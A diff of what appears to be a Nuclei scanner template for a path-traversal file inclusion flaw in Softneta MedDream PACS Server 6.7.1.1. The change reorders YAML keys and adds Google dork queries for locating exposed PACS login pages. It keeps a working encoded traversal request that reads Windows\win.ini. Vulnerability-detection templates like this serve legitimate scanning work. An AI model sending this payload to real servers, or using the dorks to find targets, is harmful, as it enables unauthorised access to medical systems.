@@ -1,5 +1,4 @@
 id: sofneta-mecdream-pacs-lfi
-
 info:
   name: Softneta MedDream PACS Server Premium 6.7.1.1 - Local File Inclusion
   author: 0x_akoko
@@ -14,21 +13,20 @@ info:
     cwe-id: CWE-22
     cpe: cpe:2.3:a:softneta:meddream_pacs:*:*:*:*:*:*:*:*
   metadata:
+    google-query: inurl:pacs/login.php, inurl:pacsone/login.php, inurl:pacsone filetype:php home, inurl:pacsone filetype:php login
     max-request: 1
+    product: meddream_pacs
     vendor: softneta
-  tags: sofneta,lfi,edb,vuln
-
+  tags: edb,lfi,sofneta,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/pacs/nocache.php?path=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini"
-
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
         part: body
+        type: word
         words:
-          - "bit app support"
-          - "fonts"
-          - "extensions"
-        condition: and
-
+          - bit app support
+          - fonts
+          - extensions
+    method: GET
+    path:
+      - '{{BaseURL}}/pacs/nocache.php?path=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini'
